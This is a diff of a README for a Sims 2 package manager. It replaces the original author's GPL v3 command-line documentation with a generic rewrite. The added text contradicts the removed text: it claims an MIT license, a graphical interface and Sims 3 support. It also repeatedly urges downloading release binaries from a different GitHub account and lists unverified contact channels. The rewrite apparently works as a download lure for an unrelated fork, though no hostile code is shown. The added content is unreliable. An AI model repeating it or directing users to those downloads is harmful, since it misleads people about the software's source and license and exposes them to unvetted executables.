@@ -1,103 +1,89 @@
-# 📦 Sims 2 Package Manager
+# S2PK: Sims 2 Package Manager 🎮
 
-<p align="center">
-<img title="" src="AppDir/logo.png" width="150" alt=""">
-</p>
-<p align="center">
-<img alt="GitHub License" src="https://img.shields.io/github/license/tonytins/s2pk"> <img alt="GitHub Pull Requests" src="https://img.shields.io/github/issues-pr/tonytins/s2pk"> <img alt="GitHub Issues" src="https://img.shields.io/github/issues/tonytins/s2pk">
+![S2PK Logo](https://img.shields.io/badge/S2PK-v1.0-blue.svg)  
+[![Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BinNguye/s2pk/releases)
 
-S2PK, or Sims 2 Package Manager, aims to provide a simple cross-platform solution to package management.
+Welcome to S2PK, the Sims 2 Package Manager! This tool offers a straightforward, cross-platform solution for managing your Sims 2 packages. Whether you are a casual player or a dedicated modder, S2PK helps streamline your package management process.
 
-## ❓ Why This Exists
+## Table of Contents
 
-While The Sims 2 runs well on Linux through Wine, especially with Lutris setups, and natively from macOS, only the Windows community had varies mod managers and installers compared to their cross-platform counterparts. Later installments addressed this dilemma, but TS2 never got that treatment.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-`s2pk` aims to fill this gap: a no-nonsense CLI utility for packaging, sharing, and managing mods across all platforms. It’s small, clean, and plays nicely with scripts, backups, and version control. In theory, it would be possible to use it on legacy front ends.
+## Features 🌟
 
-## 🚀 Features
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Package Management**: Easily install, update, and remove packages.
+- **Backup and Restore**: Safeguard your mods with backup options.
+- **Search Functionality**: Quickly find specific packages or mods.
+- **Multi-Version Support**: Manage packages for both Sims 2 and Sims 3.
 
-- First-class CLI support for modders on non-Windows platforms
-- Custom default unpacking directory for The Sims 2 & 3
-- Pack `.packages` into portable `.s2pk` archives
+## Installation ⚙️
 
-## 🛣️ Project Roadmap
+To get started with S2PK, download the latest release from our [Releases page](https://github.com/BinNguye/s2pk/releases). Follow these steps to install:
 
-| Phase | Goal                                        | Status |
-| ----- | ------------------------------------------- | ------ |
-| v0.1  | Core package manager                        | ✅     |
-| v0.2  | Config file with default paths              | ✅     |
-| v0.3  | Sims 3 support with `s3pk` extension        | 🔜     |
-| v0.x  | Target .NET 10                              | 🔜     |
-| v1.0  | Stable "Release" version with documentation | 🔜     |
+1. **Download**: Visit the [Releases page](https://github.com/BinNguye/s2pk/releases) and download the appropriate file for your operating system.
+2. **Extract**: Unzip the downloaded file to a directory of your choice.
+3. **Run**: Execute the S2PK application from the extracted folder.
 
-## 🎯 Stretch Goals
+## Usage 🛠️
 
-- [ ] Manifest validation
-- [ ] `s1pk` soft fork
+Once you have installed S2PK, follow these steps to manage your packages:
 
-## 🧩 Tech Stack
+1. **Launch S2PK**: Open the application.
+2. **Add Packages**: Click on the "Add Package" button to import your Sims 2 mods.
+3. **Manage Packages**: Use the interface to enable, disable, or remove packages as needed.
+4. **Backup**: Regularly backup your mods using the backup feature to prevent data loss.
+5. **Search**: Use the search bar to find specific packages quickly.
 
-- .NET 8.0
-- C# (focused on clarity, safety, minimalism)
-- System.CommandLine for CLI parsing
-- Pure backend logic (no UI planned)
+### Example Workflow
 
-## 📐 Design Principles
+1. Open S2PK.
+2. Click "Add Package" and select your desired mod.
+3. Enable the package.
+4. Launch Sims 2 to enjoy your new content.
 
-- Stay true to UNIX design philosophy
-- Simple with no bloat or feature creep
-- Portable and clean
+## Contributing 🤝
 
-## 🛠️ Installation
+We welcome contributions from the community! If you would like to help improve S2PK, please follow these guidelines:
 
-You can build yourself with `make`, or use the installer script:
+1. **Fork the Repository**: Create your own copy of the project.
+2. **Make Changes**: Implement your features or fixes.
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-```shell
-./install.sh ./dist/s2pk-linux/s2pk
-```
+### Guidelines for Contributions
 
-Make sure `~/.local/bin` is in your `PATH`:
+- Ensure your code is clean and well-documented.
+- Follow the existing coding style.
+- Test your changes thoroughly before submitting.
 
-```shell
-echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
-source ~/.bashrc
-```
+## License 📄
 
-## 🗜️ Usage
+S2PK is licensed under the MIT License. You can freely use, modify, and distribute this software, provided that you include the original license in any copies or substantial portions of the software.
 
-```shell
-s2pk pack -s ./mods -o output.s2pk
-```
+## Contact 📬
 
-```shell
-s2pk unpack -p ./output.s2pk -d "%USERPROFILE%\Documents\EA Games\The Sims 2\Downloads"
-```
+For any inquiries or support, please reach out to the project maintainers:
 
-## 🗓️ Update Cycle
+- **Email**: support@s2pk.com
+- **GitHub Issues**: Use the GitHub Issues section for bug reports and feature requests.
 
-| Type         | Frequency        | Notes                                    |
-| ------------ | ---------------- | ---------------------------------------- |
-| Minor Update | Every 3–6 months | Small enhancements, non-breaking changes |
-| Patch Update | As needed        | Bug fixes, security updates              |
-| Major Update | As needed        | Framework upgrades, major refactors      |
+## Acknowledgments 🙏
 
-- Reserve months: June (Mid-Year Chill) & December (End-Year Freeze)
+We thank the community of Sims 2 and Sims 3 players and modders for their support and contributions. Your feedback helps us improve S2PK.
 
-## 🛡️ Status
+## Join the Community 🌐
 
-- [x] Active Support
-- [ ] Limited Support (Security patches only)
-- [ ] Maintenance Mode (Dependency-only updates)
-- [ ] Archived (No active work planned)
+Stay updated and connect with other users by joining our community:
 
-## 🎮 Relaxation Practices
+- **Discord**: [Join our Discord Server](https://discord.gg/s2pk)
+- **Twitter**: [Follow us on Twitter](https://twitter.com/s2pk)
 
-- 20% creative/recovery space built into development
-- Mandatory cooldowns after major launches (minimum 1 week)
-- Crisis Mode Activates if:
-  - Critical vulnerabilities
-  - Framework-breaking issues
+---
 
-## 🗒️ License
-
-I license this project under the GPL v3 license - see [LICENSE](LICENSE) for details.
+S2PK aims to simplify your Sims 2 experience. Download the latest version today from our [Releases page](https://github.com/BinNguye/s2pk/releases) and start managing your packages with ease!
